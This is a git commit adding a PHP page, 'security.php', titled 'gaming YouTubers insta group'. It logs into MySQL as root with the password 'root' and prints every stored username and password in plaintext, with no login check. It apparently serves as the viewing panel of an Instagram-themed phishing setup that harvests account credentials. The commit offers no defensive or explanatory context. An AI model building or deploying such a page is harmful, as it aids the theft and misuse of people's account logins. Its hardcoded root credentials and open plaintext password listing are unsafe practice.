c2bf55f70d3c523b2c9c6f97d87556ce38fd0afc
Conding-world <91175903+Conding-world@users.noreply.github.com>
2021-09-22 10:39:05 +0530

    Add files via upload

---
+++ security.php
@@ -0,0 +1,66 @@
+<?php
+$servername = '0.0.0.0';
+$username = 'root';
+$password = 'root';
+$dbname = "User";
+
+// Create connection
+$conn = mysqli_connect($servername, $username, $password, $dbname);
+// Check connection
+
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>gaming YouTubers insta group</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  
+</head>
+<body>
+
+<table class="table">
+  <thead class="thead-dark">
+    <tr>
+      <th scope="col">Username</th>
+      <th scope="col">Password</th>
+    </tr>
+  </thead>
+<?php 
+
+
+$selectQuery = "SELECT * FROM `Data` ";
+$selectResult = mysqli_query($conn,$selectQuery);
+
+#$content = mysqli_fetch_assoc($selectResult) ;
+
+#echo $content['Name'];
+
+#echo $content['Password'];
+
+while($content = mysqli_fetch_assoc($selectResult)){
+
+?>
+<tr>
+      <td> <?php echo $content['Name']; ?></td>
+      <td> <?php echo $content['Password']; ?></td>
+    </tr>
+
+<?php
+}
+?>
+  
+    
+    
+  </tbody>
+</table>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+
+</body>
+</html>
